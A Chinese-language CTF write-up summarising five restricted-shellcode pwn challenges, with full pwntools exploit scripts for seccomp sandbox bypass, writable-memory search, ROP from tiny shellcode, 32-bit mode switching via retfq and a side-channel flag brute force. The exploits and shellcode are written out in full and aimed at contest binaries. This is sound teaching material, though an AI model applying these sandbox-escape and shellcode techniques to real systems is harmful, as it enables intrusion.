---
title: 有关特殊shellcode的题目总结
id: 122
date: 2024-01-09 20:09:12
auther: yrl
cover: 
excerpt: 前言最近遇到几个有关shellcode的题目，比较新奇，后面关于shellcode的题目都总结在这里了。比较常见的是限制shellcode的长度，尽量精简shellcode或通过指令复用来减小长度。2022NaHamConCTF -&gt; stackless (shellcode、沙箱、可写内存寻
permalink: /archives/%E6%9C%89%E5%85%B3%E7%89%B9%E6%AE%8Ashellcode%E7%9A%84%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93
categories:
 - pwn-wp
 - shellcode
tags: 
 - 最短shellcode
---

# 前言

最近遇到几个有关shellcode的题目，比较新奇，后面关于shellcode的题目都总结在这里了。

比较常见的是限制shellcode的长度，尽量精简shellcode或通过指令复用来减小长度。
## 2022NaHamConCTF -> stackless (shellcode、沙箱、可写内存寻找)

[附件及exp](https://github.com/1094093288/IMG/blob/master/Pwn/2022NaHamConCTF/stackless/)

**题目限制：**
1. 沙箱禁用execve
2. 调用shellcode前清空栈
3. 没有可写内存，需搜索寻找可写内存

解题思路：
方式一：通过shellcode搜索可写内存，写入flag
方式二：参考 Nu1l-Junior CTF方法

题目仍然然是给了源码，发现是一个执行shellcode程序，但是出题人将shellcode放到了一段随机的只读内存中，执行shellcode前还将所有寄存器和栈清空了，导致栈这个可写内存端没有了。并且开启了沙箱，只允许orw。但是orw又涉及到可写内存，由于没有泄露地址的地方，所以程序中得不到可写内存。问题就在如何获取一段可写内存了，可以看到内存段存在可写内存有bss、heap、stack段，这里只能用遍历内存的方法了。从rip开始也可以从0x7f0000000000，间隔0x2000，开始搜寻，接下来就是碰运气，在60秒之内能找到可写内存了。建议从0x7fff00000000，间隔0x10000开始，因为栈内存比较大，相对快一点。

### exp

```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
io = remote('challenge.nahamcon.com', 31986)
# libc = ELF('./libc-2.31.so')
# io = process('stackless')
#libc = ELF('./libc-2.31.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


pay = asm('''

lea rdi,[rip+0x1f5-7]
mov rsi,0
mov rdx,0
mov rax,2
syscall
mov r9,rax
/*search write memory*/
mov r8,0x1
lea r15,0x7fff00000000
loop:
add r8,0x10000
add r15,r8
/*read()*/
mov rdi,r9
mov rsi,r15
mov rdx,1024
mov rax,0
syscall
mov r12,rax
shr rax,32
cmp rax,0
jnz loop
/*write()*/
mov rdi,1
mov rsi,r15
mov rdx,r12
mov rax,1
syscall
/*exit*/
mov rdi,0
mov rax,60
syscall 

''')
# dbg()
pay = pay.ljust(0x200-7-4,'\x00')
pay += './flag.txt\x00'
sla('length\n',str(len(pay)))
sla('Shellcode\n',pay)
irt()

```

## 2023HGame -> Simple shellcode(沙箱、orw、16字节shellcode)

[附件及exp](https://github.com/1094093288/IMG/tree/master/Pwn/2023Hgame/week1/simple_shellcode)

**题目限制：**
1. 开启了沙箱禁用了execve，考虑orw
2. 限制shellcode长度16字节

利用16字节shellcode实现sys_read，将下一段shellcode读入mmap固定内存中实现orw

exp:
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
io = remote('week-1.hgame.lwsec.cn',32527)
# libc = ELF('./libc-2.31.so')
#io = process('./vuln')
elf = ELF('./vuln')
#libc = ELF('./libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

#dbg()
#pause()
shellcode = asm( "xor rax,rax;mov dl,0x80;mov rsi,rdx;push rax;pop rdi;syscall;jmp rdx")
sla('input your shellcode:',shellcode)

shellcode = shellcraft.pushstr('./flag')
shellcode += shellcraft.open('rsp')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)

sn(asm(shellcode))
irt()
```

## Nu1l-Junior CTF -> Shellcode Master(沙箱、orw ROP、17字节shellcode、构造gadget进行ROP)

[附件及exp](https://github.com/1094093288/IMG/tree/master/Pwn/2023nu1l-JuniorCTF/ShellcodeMaster_attachment)

**题目限制：**
1. 开启了沙箱禁用了execve，考虑orw
2. 限制shellcode长度17字节
3. mmap地址没有写权限，需要寻找可写内存

这个题是2022NaHamConCTF stackless和2023HGame simple shellcode的结合升级版，同样清空了栈寄存器，同样限制了shellcode长度，在执行shellcode前将mmap内存取消了写权限，导致构造sys_read没有可写内存，由于shellcode长度限制不能进行内存搜索，故2022NaHamConCTF stackless和2023HGame simple shellcode方法不可行。

整理思路：
1. 利用shellcode 调用sys_mprotect,sys_read；但是长度不足，行不通。

通过hint得知存在`movq rsp,xmm2`指令，可以将libc的可写内存写入rsp寄存器，这样就有了可写内存；

再次调整思路：利用17字节shellcode进行系统调用同时shellcode也要提供orw的ROP gadget，所以要尽量的使用push、pop，且最后有ret指令。
由于mmap内存不可写，我们只能通过在栈上ROP的方式实现orw
1. 通过`movq rsp,xmm2`将栈恢复可写
2. 通过构造sys_read向rsp处写入下一次rop数据，下一次rop实现sys_write和再一次sys_read
3. 再次返回构造sys_write泄露libc地址，sys_read再次输入`./flag`文件名和orw 的ROP链实现读取flag

调整后最终shellcode如下：
```asm
0x2023000 movq rsp,xmm2
0x2023005 xor rax,rax
0x2023008 push rax
0x2023009 push rax
0x202300a push rsp
0x202300b pop rsi
0x202300c pop rdi
0x202300d pop rax
0x202300e syscall
0x2023010 ret
```
首次执行，实现sys_read；再次从0x202300c开始执行，构造sys_write泄露libc；从0x202300a执行构造sys_read写入orw ROP链；orw均可从0x202300b开始构造open、read、write系统调用，最终实现输出flag。

exp：
```python
# -*- coding: UTF-8 -*-
from pwn import * 

#context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
#io = remote('43.137.11.211', 7724)
# libc = ELF('./libc-2.31.so')
io = process('./pwn')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

shellcode = asm( '''movq rsp,xmm2
xor rax,rax
push rax
push rax
push rsp
pop rsi
pop rdi
pop rax
syscall
ret
''')

dbg()
pause()
sa(' limited bytes!\n',shellcode)
push_rsp = 0x202300a
pop_rsi = 0x202300b
pop_rdi = 0x202300c

rop = p64(0)*2 + p64(pop_rdi) + p64(1) + p64(1) # write
rop += p64(push_rsp) + p64(0) + p64(0) # read
#rop += p64(pop_rsi) + p64(0) + p64(0) # read

sn(rop)

ru('\x7f')
libcbase = l64() - 0x15c0
lg('libcbase')

pay = './flag\x00\x00' + p64(0) 
pay += p64(pop_rsi) + p64(0) + p64(libcbase + 0x1744) +p64(2) # open
pay += p64(pop_rsi) + p64(libcbase + 0x1804) + p64(3) + p64(0) # read
pay += p64(pop_rsi) + p64(libcbase + 0x1804) + p64(1) + p64(1) # write
#pause()
sn(pay)

irt()
```

以上三个题目比较类似，都是在一定限制下的shellcode的利用，总结一下，为如何使用最短的shellcode实现getshell或orw提供思路。

## PWN -> wingtip (shellcode 、retf)

[附件](https://github.com/D1ag0n-Young/IMG/tree/master/Pwn/2023tyyactf/pwn/wingtip%E9%99%84%E4%BB%B6)

### 前置知识  ret和retf指令

在X64系统下的进程有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。

- 32模式时，CS=0x23；
- 64位模式时，CS=0x33。

这两种工作模式可以进行切换，一般通过retf指令,发生远调用。

retf指令等效于几条汇编指令
```asm
pop ip
pop cs
ret
```
如果此时栈中有0x33，则会将0x33弹出到CS寄存器中，实现32位程序切换到64位代码的过程。反之，如果栈中有0x23，将0x23弹出到CS寄存器，则实现64位程序切换到32位代码的过程。

识别32位、64位工作模式切换的两个标志：

（1）出现retf、0x23或0x33。

（2）使用类似ca1l fword的远处调用，譬如ca1l    fword ptr [ebp-0xC]。



### 题目分析

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开，程序逻辑不难：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  init(argc, argv, envp);
  buf = (void *)(int)mmap((void *)0x100000, 0x2000uLL, 7, 34, -1, 0LL);
  printf("%p\n", buf);
  read(0, buf, 0x2000uLL);
  sandbox();
  ((void (*)(void))buf)();
  close(1);
  close(2);
  close(3);
  return 0;
}
```

mmap开辟空间，输出地址，输入shellcode，然后执行shellcode，在执行之前程序开启了沙箱禁用了

```bash
➜  wingtip附件 seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x0e 0x00 0x40000000  if (A >= 0x40000000) goto 0016
 0002: 0x15 0x0d 0x00 0x0000003b  if (A == execve) goto 0016
 0003: 0x15 0x0c 0x00 0x00000142  if (A == execveat) goto 0016
 0004: 0x15 0x0b 0x00 0x0000002a  if (A == connect) goto 0016
 0005: 0x15 0x0a 0x00 0x00000029  if (A == socket) goto 0016
 0006: 0x15 0x09 0x00 0x00000031  if (A == bind) goto 0016
 0007: 0x15 0x08 0x00 0x00000032  if (A == listen) goto 0016
 0008: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0016
 0009: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0016
 0010: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0016
 0011: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0016
 0012: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0016
 0013: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0016
 0014: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return a1LOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

禁用了64位几乎所有的可以用来getshell或者orw的系统调用，但是并没有判断arch，可以执行32位下的shellcode，这个时候就涉及到retf指令的作用。

shellcode首先通过retf将模式改为32位，然后进行orw，这里为什么不execve呢？因为在测试后发现32位execve实际上是被禁用的。

汇编模式转换使用：
```asm
content='''
push 0x23;
push 0xff040;
mov rax,0x1000;
add [rsp],rax;
retfq;
'''
```
后面就是orw的过程了

### exp

```python
# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.arch = "amd64"
context.termina1 = ["/usr/bin/tmux","sp","-h"]
binary = 'pwn'
loca1 = 1
if loca1 == 1:
    #io=process(argv=['qemu-mipsel','-g','1234','-L','./','pwn'])
    io=process('./pwn')
else:
    io=remote('39.106.131.193',43268)
e=ELF(binary)

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=Fa1se		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eva1(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

map_addr = int(ru('\n'),16)
lg('map_addr')

##sys_read_content
content='''
push 0x23;
push 0x100040;
/*mov rax,0x1000;
add [rsp],rax;*/
retfq;
'''
 
##sys_open_flag
sys_open='''
mov esp,0x100020;
mov ebx,0x100020;
xor ecx,ecx;
mov eax,0x5;
int 0x80;
'''

##sys_read(fd,0x100050,0x40)
syss_read='''
mov esp,0x100070;
mov ebx,eax;
mov ecx,0x100150;
mov edx,0x40;
mov eax,3;
int 0x80;
'''
 
##sys_write(1,0x100050,0x40)
sys_write='''
mov rbx,1;
mov eax,4;
int 0x80;
'''
content=asm(content)
content=content.ljust(0x20,'\x00')+'./flag.txt'.ljust(16,'\x00')
#content=content.ljust(0x20,'\x00')+'/bin/sh\x00'.ljust(16,'\x00')
content=content.ljust(0x40,'\x00')+asm(sys_open)
content=content.ljust(0x4d,'\x00')+asm(syss_read)+asm(sys_write)

#dbg()
pause()
sl(content)
irt()
```

### 碎碎念

题目在执行完shellcode之后才close所有的标准输出、错误流等，这里对orw没有影响，实际程序是不会执行到close的地方的；假如把close放到shellcode执行前，那么orw的方法不起作用，可能要考虑测信道或者重定向输出流到输入流上。

## 2024GeekCTF -> shellcode

[附件](https://github.com/D1ag0n-Young/IMG/tree/master/Pwn/2024geekctf/shellcode)

此题实际上是有限制条件的shellcode，check逻辑如下：
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int i; // [rsp+0h] [rbp-10h]
  int v5; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  ((void (__fastcall *)(__int64, char **, char **))((char *)&sub_1248 + 1))(a1, a2, a3);
  puts("Please input your shellcode: ");
  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);
  sub_1290();
  v5 = read(0, buf, 0x200uLL);
  for ( i = 0; i < v5; ++i )
  {
    if ( (char)(*((char *)buf + i) % 2) != i % 2 ) // buf偶位为偶数，奇位为奇数，且奇数不能大于128，不然会变成负数
      return 0xFFFFFFFFLL;
  }
  ((void (*)(void))buf)();
  return 0LL;
}
```
程序mmap了一段RWX内存，来执行shellcode，然后sub_1290()函数设置了沙箱规则，check规则为buf的偶数位为偶数，奇数位为奇数，且奇数在[0,128]范围内，这个限制还是很死的，再来看程序开了什么沙箱规则：
```shell
➜  2024geekctf seccomp-tools dump ./shellcode
Please input your shellcode: 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007
 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```
判断了架构、系统调用，设置了白名单只允许调用open、read，不能write，那我们只能考虑测信道或者是shellcode盲注了

### bypass shellcode check

在这么严格的限制下直接构造符合要求的shellcode是很难的，所以我们转换一下思路，先构造一个符合要求的输入功能，通过这一次的输入布置没有限制的shellcode。通过调试发现rax，rsi, 都指向shellcode起始位置，rdi为0：
```shell
*RAX  0x7f8bc1ad6000 ◂— push rax /* 0x515253c031485b50 */    
 RBX  0x55f5339df3e0 ◂— endbr64                              
*RCX  0x0                     
*RDX  0x0                     
 RDI  0x0                     
 RSI  0x7f8bc1ad6000 ◂— push rax /* 0x515253c031485b50 */
 R8   0x7                     
 R9   0x50                    
 R10  0x1                     
 R11  0x246                   
 R12  0x55f5339df160 ◂— endbr64 
 R13  0x7fff501d47a0 ◂— 0x1
 R14  0x0                     
 R15  0x0                     
 RBP  0x7fff501d46b0 ◂— 0x0
*RSP  0x7fff501d46a0 ◂— 0x1900000019
*RIP  0x55f5339df3d5 ◂— call rax
```
我们只需要控制如下寄存器即可：

- RAX=0
- RDX=非零值，最好大于0x100小于0x1000（防止越界写报SIGSEGV或者read不成功）
- 调用syscall

所以于如何构造符合check要求的read功能的shellcode？难点在syscall指令汇编为`\x0f\x05`，不满足奇数偶数相间的条件，那么假如输入的时候为`\x0e\x05`，就符合要求了，之后在shellcode运行过程中动态将`\x0e\x05`还原为`\x0f\x05`。

我们就要看看能否找到符合check条件的add/sub指令，可以加一或减一，经过尝试寻找总结如下规律：
```c
0:  50                      push   rax
1:  53                      push   rbx
2:  51                      push   rcx
3:  52                      push   rdx
4:  56                      push   rsi
5:  57                      push   rdi
6:  41 50                   push   r8
8:  41 51                   push   r9
a:  41 52                   push   r10
c:  41 53                   push   r11
e:  41 54                   push   r12
10: 41 55                   push   r13
12: 41 56                   push   r14
14: 41 57                   push   r15
16: 58                      pop    rax
17: 5b                      pop    rbx
18: 59                      pop    rcx
19: 5a                      pop    rdx
1a: 5e                      pop    rsi
1b: 5f                      pop    rdi
1c: 41 58                   pop    r8
1e: 41 59                   pop    r9
20: 41 5a                   pop    r10
22: 41 5b                   pop    r11
24: 41 5c                   pop    r12
26: 41 5d                   pop    r13
28: 41 5e                   pop    r14
2a: 41 5f                   pop    r15
2c: 0f 05                   syscall
2e: 41 30 01                xor    BYTE PTR [r9],al
31: 80 43 0c 01             add    BYTE PTR [rbx+0xc],0x1
```
- 解决指令间奇偶冲突

push/pop指令有单字节和双字节，单字节的push都是奇偶交替的，所以可以通过push/pop栈（对于执行shellcode来说push栈不影响执行）来调整指令之间的奇偶性冲突问题，可谓通杀;比如第一个指令结尾是偶数，第二条指令开头是偶数，那就要构造奇-偶-奇这样的中间值来解决奇偶交替问题

还可以通过`41 30 01  xor    BYTE PTR [r9],al`来调整，不过要确保r9寄存器中存在可写地址

- 指令内字节码的奇偶冲突怎么办？

可以通过调整奇偶性来解决，如`add    BYTE PTR [rbx+0xc], 0x1` ，将rbx设置成buf地址即可通过偏移来修改特定字节奇偶性，输入的时候减一，符合check，shellcode运行的时候再通过add动态还原，类似的还有`add DWORD PTR [rax+0xb], 0x2`，可以实现将字节码调整到大于128的数值

- rdx控制到合适大小

shellcode加载时发现r11寄存器的值为0x246符合要求，利用`push r11;pop r11;`即可，但是其对应机器码`\x41\x53\x5a`同样存在指令内奇偶冲突，但我们已经具有调整指令内奇偶冲突的能力了

- syscall调整

通过调整指令内奇偶冲突的能力调整syscall的机器码使其符合要求

解决以上问题后就可以构造read功能的shellcode了，构造如下：

```python
asm1 = asm(
   "push   rax;\n"                          # 0:   50                      
   "pop    rbx;\n"                          # 1:   5b                      
   "xor    rax,rax;\n"                      # 2:   48 31 c0                  
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51  
   "add    BYTE PTR [rbx+0xc], 0x1;\n"      # 8:   80 43 0c 01             
   "push   r11;\n"                          # c:   41 53                   
   "pop    rdx;\n"                          # e:   5a                      
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51 
   "add    BYTE PTR [rbx+0x16], 0x1;\n"     # 12:   80 43 16 01             
   "syscall;\n"                             # 16:   0f 05                   
   "nop;\n"                                 # 18:   90                      
)
```
调整后：
```
asm1 = asm(
   "push   rax;\n"                          # 0:   50                      
   "pop    rbx;\n"                          # 1:   5b                      
   "xor    rax,rax;\n"                      # 2:   48 31 c0                  
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51  
   "add    BYTE PTR [rbx+0xc], 0x1;\n"      # 8:   80 43 0c 01             
   "push   r11;\n"                          # c:   40 53                   
   "pop    rdx;\n"                          # e:   5a                      
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51 
   "add    BYTE PTR [rbx+0x16], 0x1;\n"     # 12:   80 43 16 01             
   "syscall;\n"                             # 16:   0e 05                   
   "nop;\n"                                 # 18:   90                      
)

asm1 = b"\x50" \
        b"\x5b" \
        b"\x48\x31\xc0" \
        b"\x53\x52\x51" \
        b"\x80\x43\x0c\x01" \
        b"\x40\x53" \
        b"\x5a" \
        b"\x53\x52\x51" \
        b"\x80\x43\x16\x01" \
        b"\x0e\x05" \
        b"\x90"
```

至此我们具有了又一次输入shellcode机会，并且没有任何限制。

### bypass seccomp沙箱

我们可以执行任意shellcode了，不过只能open、read，不能write输出flag，这就需要通过shellcode盲注或者说测信道方式得到flag，思路都是一样的，通过构造单字节输入并于内存中的flag作比较，通过匹配成功和不成功程序状态的不同来判别内存中flag的值

对于此题，我们构造循环的单字节输入，并于内存中flag作比较，若不同继续循环接收输入作比较，知道相同时使得程序停止，通过匹配和不匹配程序状态的差异来确认flag具体是哪个字符

构造shellcode如下：
```python
    shellcode = asm(
        # we already input "flag\0" at RSI, now we open it
        "mov rax, 2\n"
        "mov r10, rsi\n"
        "mov rdi, rsi\n"
        "push rdi\n"
        "pop rdi\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n"
        "syscall\n"
        # read flag content
        "lea rsi, [r10 + 0x400]\n"
        "mov rdi, rax\n"
        "xor rax, rax\n"
        "mov rdx, 0x100\n"
        "syscall\n"
        # read i-th character into r8b
        # we also want to crash directly if this is null-byte
        "next:\n"
        "mov r8b, byte ptr [r10 + 0x400 + {}]\n"
        "cmp r8b, 0\n"
        "jz end\n"
        # loop reading from stdin until equal
        "loop:\n"
        "lea rsi, [r10 + 0x800]\n"
        "mov rdi, 0\n"
        "xor rax, rax\n"
        "mov rdx, 0x1\n"
        "syscall\n"

        "mov r9b, byte ptr [r10 + 0x800]\n"
        "cmp r8b, r9b\n"
        "jnz loop\n"
        # crash
        "end:\n"
        "hlt\n".format(str(i))
        )
```

其中i为爆破flag迭代的下标

### exp

```python
# -*- coding: utf-8 -*-
from pwn import *
# context.log_level = 'INFO'
context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./shellcode')

one64 = [0x45226,0x4527a,0xf0364,0xf1207]


sl = lambda s : p.sendline(s.encode())
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode())
irt = lambda : p.interactive()

def ms(name,addr):
    print(name + "---->" + hex(addr))

def debug(mallocr,PIE=True):
    if PIE:
        # print(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0])
        text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))

asm1 = asm(
   "push   rax;\n"                          # 0:   50                      
   "pop    rbx;\n"                          # 1:   5b                      
   "xor    rax,rax;\n"                      # 2:   48 31 c0                  
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51  
   "add    BYTE PTR [rbx+0xc], 0x1;\n"      # 8:   80 43 0c 01             
   "push   r11;\n"                          # c:   41 53                   
   "pop    rdx;\n"                          # e:   5a                      
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51 
   "add    BYTE PTR [rbx+0x16], 0x1;\n"     # 12:   80 43 16 01             
   "syscall;\n"                             # 16:   0f 05                   
   "nop;\n"                                 # 18:   90                      
)

asm1 = b"\x50" \
        b"\x5b" \
        b"\x48\x31\xc0" \
        b"\x53\x52\x51" \
        b"\x80\x43\x0c\x01" \
        b"\x40\x53" \
        b"\x5a" \
        b"\x53\x52\x51" \
        b"\x80\x43\x16\x01" \
        b"\x0e\x05" \
        b"\x90"


flag = ''

for i in range(0x50):
    if local:
        p = process('./shellcode')
        libc = elf.libc
    else:
        p = remote('chall.geekctf.geekcon.top',40245)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    debug(0x13d5,1)
    pause()
    p.sendafter(b"shellcode: ",asm1)
    shellcode = asm(
        # we already input "flag\0" at RSI, now we open it
        "mov rax, 2\n"
        "mov r10, rsi\n"
        "mov rdi, rsi\n"
        "push rdi\n"
        "pop rdi\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n"
        "syscall\n"
        # read flag content
        "lea rsi, [r10 + 0x400]\n"
        "mov rdi, rax\n"
        "xor rax, rax\n"
        "mov rdx, 0x100\n"
        "syscall\n"
        # read i-th character into r8b
        # we also want to crash directly if this is null-byte
        "next:\n"
        "mov r8b, byte ptr [r10 + 0x400 + {}]\n"
        "cmp r8b, 0\n"
        "jz end\n"
        # loop reading from stdin until equal
        "loop:\n"
        "lea rsi, [r10 + 0x800]\n"
        "mov rdi, 0\n"
        "xor rax, rax\n"
        "mov rdx, 0x1\n"
        "syscall\n"

        "mov r9b, byte ptr [r10 + 0x800]\n"
        "cmp r8b, r9b\n"
        "jnz loop\n"
        # crash
        "end:\n"
        "hlt\n".format(str(i))
        )
    p.sendline(b"flag\x00"+b'\x90'*0x20 + shellcode)
    print("==========flag: " + flag)
    stringtable = "0123456789abcdefghijklmnopqrstuvwxyz{}-_"
    # stringtable = string.printable
    for j in stringtable:
        try:
            print("try: " + j)
            pause()
            p.sendline(j.encode())
            sleep(0.4)
            p.sendline(b'\xff')
            p.sendline(b'\xff')
            if(j == stringtable[len(stringtable)-1]):
                flag += 'X' 
        except:
            p.close()
            flag += j
            success("flag maybe: " + flag)
            break

```
